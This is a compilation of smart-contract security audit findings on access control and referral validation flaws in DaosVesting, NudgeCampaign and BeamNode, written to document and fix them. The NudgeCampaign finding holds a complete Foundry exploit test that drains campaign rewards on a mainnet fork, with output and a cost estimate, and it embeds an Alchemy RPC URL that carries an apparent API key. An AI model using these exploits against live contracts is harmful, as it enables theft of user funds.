# Cluster -1148

**Rank:** #190  
**Count:** 60  

## Label
Common vulnerability type: **Missing access control and improper referral validation** enabling unauthorized reward claims, fee manipulation, and revenue leakage through self-referencing or expired referrals.

## Cluster Information
- **Total Findings:** 60

## Examples

### Example 1

**Auto Label:** Common vulnerability type: **Input validation failures enabling unauthorized access, gas exhaustion, or reward manipulation through forged or manipulated state transitions.**  

**Original Text Preview:**

## Severity

Critical Risk

## Description

The `DaosVesting::claim()` function has a critical vulnerability that allows an attacker to drain tokens from legitimate DAOs. The issue stems from insufficient validation of the DAO contract address and its state.

Vulnerable code in `DaosVesting::claim()`:

```solidity
function claim(address dao, address user, uint256 index) external {
    IDaosLive daosLive = IDaosLive(dao);
@-> address token = daosLive.token();

@-> uint256 maxPercent = getClaimablePercent(dao, index);
    if (maxPercent > DENOMINATOR) revert InvalidCalculation();

    unchecked {
@->     uint256 totalAmount = daosLive.getContributionTokenAmount(user);
        uint256 maxAmount = (totalAmount * maxPercent) / DENOMINATOR;
        if (maxAmount < claimedAmounts[dao][user]) {
            revert InvalidCalculation();
        }
        uint256 amount = maxAmount - claimedAmounts[dao][user];

        if (amount > 0) {
            claimedAmounts[dao][user] += amount;
            totalClaimeds[dao] += amount;
@->         TransferHelper.safeTransfer(token, user, amount);
            observer.emitClaimed(dao, token, user, amount);
        }
    }
}
```

**Attack Vector:**

1. Attacker deploys fake malicious contract implementing `IDaosLive`
2. Sets `token` address to a legitimate DAO's token
3. Implements `getContributionTokenAmount()` to manually return the amount of legit `DaosLive` tokens locked in `DaoVesting.sol` contract.
4. Sets vesting schedules of that Fake `IDaosLive` implementation with 100% unlock for an `index`.
5. Calls `claim()` on the vesting contract with their Fake malicious `DoasLive` contract address
6. Receives tokens from the legitimate DAO's vesting contract

## Location of Affected Code

File: [contracts/DaosVesting.sol#L91](https://github.com/ED3N-Ventures/daoslive-sc/blob/9a1856db2060b609a17b24aa72ab35f2cdf09031/contracts/DaosVesting.sol#L91)

```solidity
function claim(address dao, address user, uint256 index) external {
    IDaosLive daosLive = IDaosLive(dao);
@-> address token = daosLive.token();

@-> uint256 maxPercent = getClaimablePercent(dao, index);
    if (maxPercent > DENOMINATOR) revert InvalidCalculation();

    unchecked {
@->     uint256 totalAmount = daosLive.getContributionTokenAmount(user);
        uint256 maxAmount = (totalAmount * maxPercent) / DENOMINATOR;
        if (maxAmount < claimedAmounts[dao][user]) {
            revert InvalidCalculation();
        }
        uint256 amount = maxAmount - claimedAmounts[dao][user];

        if (amount > 0) {
            claimedAmounts[dao][user] += amount;
            totalClaimeds[dao] += amount;
@->         TransferHelper.safeTransfer(token, user, amount);
            observer.emitClaimed(dao, token, user, amount);
        }
    }
}
```

## Impact

- Complete drain of tokens from legitimate DAOs
- Loss of all funds of vested tokens that should have been claimed by the real contributors of `DaosLive`
- Permanent loss of tokens
- Affects all DAOs using the vesting contract.

## Recommendation

- Restrict the caller to claim the tokens only through `DaosLive` contract function, claim only. Do not allow users to clam directly through the vesting contract.
- Validate that the DAO contract is legitimate or not.

## Team Response

Fixed.

---
### Example 2

**Auto Label:** Insufficient input validation and improper state checks enable attackers to claim rewards multiple times or redirect rewards to unauthorized addresses, leading to reward theft and financial loss.  

**Original Text Preview:**

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L164-L233>

<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L308-L321>

### Summary

The `NudgeCampaign::handleReallocation` function allows any attacker to manipulate reward allocations through flash loans or repeated calls with real fund via Li.Fi’s executor. This can lead to reward depletion and disruption of legitimate user rewards even after invalidating the attacker

### Vulnerability Details

The vulnerability stems from two main issues:

1. **Insufficient Caller Validation**: While the function checks for `SWAP_CALLER_ROLE`, this role is assigned to Li.Fi’s executor which can be called by anyone, effectively bypassing intended access controls.
2. **Reward Accounting Flaw**: The system fails to properly reset claimable amounts when participations are invalidated, allowing attackers to:

   * Claim all allocations through flash loans
   * Perform repeated reallocations via Li.Fi’s executor
   * Cause permanent reduction of available rewards through multiple invalidations

The `invalidateParticipations` function only subtracts from `pendingRewards` but doesn’t return the fees to the claimable pool, creating a growing discrepancy in reward accounting.

### Proof of Concept

Here is a test to prove this. This was run in mainnet fork. Since this will be deployed on Ethereum and other L2s in from the doc. Create a new test file and add this to the test suite `src/test/NudgeCampaignAttackTest.t.sol`.
```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import { Test, console } from "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";
import { NudgeCampaign } from "../campaign/NudgeCampaign.sol";
import { NudgeCampaignFactory } from "../campaign/NudgeCampaignFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { FlashLoanAttackContract } from "./FlashLoanAttackContractTest.t.sol";
import { IBaseNudgeCampaign } from "../campaign/interfaces/INudgeCampaign.sol";

library LibSwap {
  struct SwapData {
    address callTo;
    address approveTo;
    address sendingAssetId;
    address receivingAssetId;
    uint256 fromAmount;
    bytes callData;
    bool requiresDeposit;
  }
}

interface ILifiExecutor is IERC20 {
  function erc20Proxy() external view returns (address);
  function swapAndExecute(
    bytes32 _transactionId,
    LibSwap.SwapData[] calldata _swapData,
    address _transferredAssetId,
    address payable _receiver,
    uint256 _amount
  )
    external
    payable;
}

contract NudgeCampaignAttackTest is Test {
  NudgeCampaign private campaign;
  address NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
  address owner;
  uint256 constant REWARD_PPQ = 2e13;
  uint256 constant INITIAL_FUNDING = 100_000e18;
  address campaignAdmin = address(14);
  address nudgeAdmin = address(15);
  address treasury = address(16);
  address operator = address(17);
  address alternativeWithdrawalAddress = address(16);
  address campaignAddress;
  uint32 holdingPeriodInSeconds = 60 * 60 * 24 * 7; // 7 days
  uint256 rewardPPQ = 2e13;
  uint256 RANDOM_UUID = 111_222_333_444_555_666_777;
  uint16 DEFAULT_FEE_BPS = 1000;
  NudgeCampaignFactory factory;
  address constant SWAP_CALLER = 0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D; //LIFI EXECUTOR
  string constant MAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/j7SKDcG36WqFJxaAGYTsKo6IIDFSmFhl";
  IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); //rewardToken
  IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); //toToken
  ILifiExecutor constant LIFI_EXECUTOR = ILifiExecutor(0x2dfaDAB8266483beD9Fd9A292Ce56596a2D1378D);

  FlashLoanAttackContract flashLoanAttackContract;
  address attacker = makeAddr("Attacker");
  uint256[] pIDsWithOne = [1];

  function setUp() public {
    vm.createSelectFork(MAINNET_RPC_URL);

    owner = msg.sender;

    factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, SWAP_CALLER);

    campaignAddress = factory.deployCampaign(
      holdingPeriodInSeconds,
      address(DAI),
      address(WETH),
      REWARD_PPQ,
      campaignAdmin,
      0,
      alternativeWithdrawalAddress,
      RANDOM_UUID
    );
    campaign = NudgeCampaign(payable(campaignAddress));

    flashLoanAttackContract = new FlashLoanAttackContract(campaign);

    vm.deal(campaignAdmin, 10 ether);

    deal(address(WETH), campaignAdmin, 10_000_000e18);

    vm.prank(campaignAdmin);
    WETH.transfer(campaignAddress, INITIAL_FUNDING);
  }

  function deployCampaign(address DAI_, address WETH_, uint256 rewardPPQ_) internal returns (NudgeCampaign) {
    campaignAddress = factory.deployCampaign(
      holdingPeriodInSeconds, DAI_, WETH_, rewardPPQ_, campaignAdmin, 0, alternativeWithdrawalAddress, RANDOM_UUID
    );
    campaign = NudgeCampaign(payable(campaignAddress));

    return campaign;
  }

function test_attackReallocationTest() public {
    uint256 count;
      uint256 toAmount = 300_768e18;
    deal(address(DAI), attacker, toAmount);

    while (campaign.claimableRewardAmount() > 6000e18) {
      pIDsWithOne[0] = count + 1;
      bytes memory dataToCall = abi.encodeWithSelector(
        campaign.handleReallocation.selector, RANDOM_UUID, address(SWAP_CALLER), address(DAI), toAmount, ""
      );
      bytes32 transactionId = keccak256(abi.encode(DAI, block.timestamp, tx.origin));
      LibSwap.SwapData[] memory swapData = new LibSwap.SwapData[](1);
      swapData[0] =
        LibSwap.SwapData(address(campaign), address(campaign), address(DAI), address(DAI), toAmount, dataToCall, false);

      uint256 gasStart = gasleft();
      vm.startPrank(attacker);
      IERC20(DAI).approve(LIFI_EXECUTOR.erc20Proxy(), toAmount);

      LIFI_EXECUTOR.swapAndExecute(transactionId, swapData, address(DAI), payable(attacker), toAmount);
      vm.stopPrank();
      uint256 gasEnd = gasleft();
      if (count == 0) {
        console.log("Gas used per attack = ", gasStart - gasEnd);
      }

      vm.prank(operator);
      campaign.invalidateParticipations(pIDsWithOne);
      count++;
    }

    uint256 newClaimableReward = campaign.claimableRewardAmount();
    console.log("Final Claimable Reward:", newClaimableReward);
    console.log("Number of times attack ran", count);

  }
}
```

Then run with `forge test --mt test_attackReallocationTest -vvv`. Here is the result:
```

 forge test --mt test_attackReallocationTest -vvv
[⠰] Compiling...
[⠔] Compiling 1 files with Solc 0.8.28
[⠒] Solc 0.8.28 finished in 4.06s
Compiler run successful!

Ran 1 test for src/test/NudgeCampaignAttackTest.t.sol:NudgeCampaignAttackTest
[PASS] test_attackReallocationTest() (gas: 40900516)
Logs:
  Gas used per attack =  432808
  Final Claimable Reward: 5558848000000000000000
  Number of times attack ran 157

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 10.94s (3.72s CPU time)

Ran 1 test suite in 10.96s (10.94s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

* Gas used per attack: 432808
* Attack ran 157 times
* Total gas: `432808 * 157 = 67950856`
  With the current Ethereum gas price of 0.701 gwei per gas, it’ll cost 0.`701 * 67950856` gwei = 47633550.056 gwei
* This is 0.0476 Ether (Current Ether price is `$2087`). `2087 * 0.0476 = $99.34`
* It cost about `$99.34` in gas to launch the attack. This will be cheaper on L2, making this attack very possible.

### Impact

This vulnerability allows attackers to:

* Maliciously allocate campaign rewards through flash loans
* Perform denial-of-service attacks on legitimate users’ rewards
* Permanently reduce available rewards through repeated invalidations
* Disrupt the intended economic model of the campaign system

The attack could be executed at minimal cost and would be difficult to detect until rewards are significantly depleted.

### Tools Used

Foundry

### Recommended mitigation steps

Fix reward accounting:
```

function invalidateParticipations(uint256[] calldata pIDs) external onlyNudgeOperator {
    for (uint256 i = 0; i < pIDs.length; i++) {
        Participation storage participation = participations[pIDs[i]];

        if (participation.status != ParticipationStatus.PARTICIPATING) {
            continue;
        }

        participation.status = ParticipationStatus.INVALIDATED;
        uint256 totalReward = participation.rewardAmount +
                            (participation.rewardAmount * feeBasisPoints / BASIS_POINTS);
        pendingRewards -= participation.rewardAmount;
        claimableRewards += totalReward; // Add to claimable pool
    }
    emit ParticipationInvalidated(pIDs);
}
```

**raphael (Nudge.xyz) confirmed**

---

---
### Example 3

**Auto Label:** Common vulnerability type: **Missing access control and improper referral validation** enabling unauthorized reward claims, fee manipulation, and revenue leakage through self-referencing or expired referrals.  

**Original Text Preview:**

In BeamNode, we have one referral system. When users deposit with one referral for the first time, they can buy one NFT at a discounted price. When users want to deposit with the referrer for the second time, we will not provide one discount for them.

The problem is that this design is quite easy to be bypassed. If users want to deposit with the referrer the second time, they can transfer funds to another address and deposit and get the discount.

```solidity
    function _setReferrer(address _user, address _referrer) internal {
        if (users[_user].referrer == address(0) && _isValidReferrer(_user, _referrer)) {
            users[_user].referrer = _referrer;
        } else {
            require(_referrer == address(0), InvalidReferral());
        }
    }
```

If this design is necessary, we should add one depositor whitelist for this function.

---
